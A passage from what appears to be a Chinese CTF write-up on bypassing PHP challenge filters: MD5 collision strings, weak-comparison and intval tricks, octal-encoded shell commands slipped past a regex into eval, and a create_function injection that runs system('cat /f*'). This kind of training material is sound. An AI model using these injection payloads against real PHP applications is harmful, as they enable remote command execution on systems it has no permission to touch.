class="string">&#x27;md5_1&#x27;</span>])</span><br><span class="line"> === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>])) </span><br></pre></td></tr></table></figure><blockquote><p>可以看到依旧是md5强比较 并且string() 函数导致我们无法使用数组直接绕过<br>可以使用md5碰撞 找到两个数据不同但是md5相同的值</p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>md5_1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;<br>md5_2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br>post参数 md5_3&#x3D;1</p></blockquote><h2 id="第二关-3z-RC3-php"><a href="#第二关-3z-RC3-php" class="headerlink" title="第二关  3z_RC3.php"></a>第二关  3z_RC3.php</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><blockquote></blockquote> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!!!!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>)); </span><br></pre></td></tr></table></figure><blockquote><p><strong>方法一</strong>:<br>一般来讲思路就是直接用$shell当作system 主要是如何绕过cmd中的命令<br>可以使用八进制编码<br>cmd&#x3D;$(echo “\154\163”) ls命令<br>cmd&#x3D;$(echo “\143\141\164\40\57\146\52”) cat &#x2F;f*<br><strong>方法二:</strong><br>传递参数方法 shell&#x3D;urldecode&amp;123&#x3D;cat &#x2F;f*<br>cmd&#x3D;system($_POST[‘123’]);</p></blockquote><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p><strong>方法一</strong>:<br>cmd&#x3D;$(echo “\154\163”) ls命令<br>cmd&#x3D;$(echo “\143\141\164\40\57\146\52”) cat &#x2F;f*<br><strong>方法二:</strong><br>shell&#x3D;urldecode&amp;123&#x3D;cat &#x2F;f*<br>cmd&#x3D;system($_POST[‘123’]);</p></blockquote><hr><h1 id="NSSRound-16-Basic-了解过PHP特性吗"><a href="#NSSRound-16-Basic-了解过PHP特性吗" class="headerlink" title="[NSSRound#16 Basic]了解过PHP特性吗"></a>[NSSRound#16 Basic]了解过PHP特性吗</h1><h2 id="第一关思路"><a href="#第一关思路" class="headerlink" title="第一关思路"></a>第一关思路</h2><blockquote><p>主要分为五个关 直到最后便可以通关</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br></pre></td></tr></table></figure><blockquote><p>intval绕过直接传递数组 num[]&#x3D;1</p></blockquote><h3 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line"><span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>; </span><br></pre></td></tr></table></figure><blockquote><p>php 弱比较 判定ctype必须全是字母 is_num全是数字<br>主要要取逆序 则数字可以取 807016042<br>字母可以取  OZDCKNQ</p></blockquote><h3 id="3"><a href="#3" class="headerlink" title="(3)"></a>(3)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>依旧是php的弱比较需要知道php 科学计数法相关内容<br>114&#x3D;9e9   9e9科学计数法大于114514<br>514不能全是数字那么根据若比较99999991a 是大于 9999999</p></blockquote><h3 id="4"><a href="#4" class="headerlink" title="(4)"></a>(4)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>主要是array_search函数的bug 它用的是弱比较搜索”NSS” 因此直接传一个array[]&#x3D;0 就可以了可以直接绕过for循环语句 并且在array_search中0&#x3D;&#x3D;”NSS” 得到0对应的序号就是第一个也是0  则0&#x3D;&#x3D;&#x3D;0</p></blockquote><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$nss</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>];</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shell</span>)&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$nss</span>))&#123;</span><br><span class="line">    <span class="variable">$nss_shell</span> = <span class="title function_ invoke__">create_function</span>(<span class="variable">$shell</span>,<span class="variable">$nss</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>nss&#x3D;echo 0;}system(“cat &#x2F;f*”);&#x2F;&#x2F;&amp;shell&#x3D;<br>这一关主要就是一个creat_function函数的作用<br>产生的代码执行 ;}闭合掉函数的} 使得后面的system函数成为独立的代码</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
